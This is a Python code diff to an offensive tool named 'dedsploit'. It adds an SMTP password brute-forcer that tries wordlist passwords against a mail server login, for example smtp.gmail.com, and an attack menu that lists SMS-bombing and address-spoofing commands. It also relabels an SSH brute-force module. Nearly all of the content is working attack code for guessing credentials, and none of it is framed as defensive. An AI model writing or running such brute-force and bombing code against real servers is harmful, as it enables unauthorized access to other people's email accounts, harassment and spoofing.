@@ -99,12 +99,36 @@ def sshBruteforce(address, username, wordlist, port):
             pass
         wordlist.close()
 
+
+def smtpBruteforce(address, username, wordlist, port):
+    wordlist = open(wordlist, 'r')
+    for i in wordlist.readlines():
+        password = i.strip("\n")
+        try:
+            s = smtplib.SMTP(str(address), int(port))
+            s.ehlo()
+            s.starttls()
+            s.ehlo
+            s.login(str(username), str(password))
+            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+            s.close()
+        except Exception, e:
+            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
+        except:
+             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
+             sleep(1)
+
+#######################
+# SSH Module for dedsploit!
+#######################
+
 def ssh():
     while True:
         table_data = [
-            ["SSH Available Commands", ""],
+            ["SSH (Secure SHell) Attack Module", "Available Commands"],
+            ["list", "Show all available commands"],
             ["exit", "Exit the SSH attack module"],
-            ["bruteforce", "Bruteforce SSH server"],
+            ["bruteforce", "Bruteforce an SSH server with paramiko"],
         ]
         table = AsciiTable(table_data)
         print table.table
@@ -119,9 +143,9 @@ def ssh():
                 print "Required Options:"
                 print "-----------------------------------------------"
                 print "target <server>  | Set the target SSH server"
-                print "port <number>    | Set SSH port"
+                print "port <number>    | Set SSH port (default 22)"
                 print "username <name>  | Set username"
-                print "wordist </path>  | Path to wordlist"
+                print "wordlist </path> | Path to wordlist"
                 print "start bruteforce | Start the attack once everything is set"
                 print "-----------------------------------------------"
                 while True:
@@ -144,6 +168,61 @@ def ssh():
                         continue
                     elif pre == "start":
                         sshBruteforce(ssh_target, ssh_username, wordlist, ssh_port)
+            else:
+                raise ValueError
+                continue
+        except ValueError:
+            print R + "[!] Command not Recognized [!]" + W
+            continue
+
+def smtp():
+    while True:
+        table_data = [
+            ["SMTP (Simple Male Transfer Protocol) Attack", "Module Available Commands"],
+            ["list", "Show all available commands"],
+            ["exit", "Exit the SSH attack module"],
+            ["bruteforce", "Bruteforce a SMTP account"],
+            ["smsbomb", "Bomb SMS using fake SMTP server"],
+            ["fakeaddr", "Fake an SMTP address"]
+        ]
+        table = AsciiTable(table_data)
+        print table.table
+        print LC + "Type 'list' to show all of available modules" + W
+        try:
+            smtp_options = raw_input(P + "smtp>> " + W )
+            if smtp_options == "list":
+                print table.table
+            elif smtp_options == "exit":
+                break
+            elif smtp_options == "bruteforce":
+                print "Required Options:"
+                print "-----------------------------------------------"
+                print "target <server>  | Set the target SMTP server. For e.g, 'smtp.gmail.com'"
+                print "port <number>    | Set SMTP port (default 587)"
+                print "username <name>  | Set username (without @email account identifier)"
+                print "wordlist </path> | Path to wordlist"
+                print "start bruteforce | Start the attack once everything is set"
+                print "-----------------------------------------------"
+                while True:
+                    pre, smtpbrute = raw_input(P + "smtp>>bruteforce>> " + W).split()
+                    if pre == "target":
+                        smtptarget = smtpbrute
+                        print "Target => ", smtptarget
+                        continue
+                    elif pre == "port":
+                        smtpport = smtpbrute
+                        print "Port => ", smtpport
+                        continue
+                    elif pre == "username":
+                        smtpusername = smtpbrute
+                        print "Username => ", smtpusername
+                        continue
+                    elif pre == "wordlist":
+                        wordlist = smtpbrute
+                        print "Wordlist => ", wordlist
+                        continue
+                    elif pre == "start":
+                        smtpBruteforce(smtptarget, smtpusername, wordlist, smtpport)
             else:
                 raise ValueError
                 continue
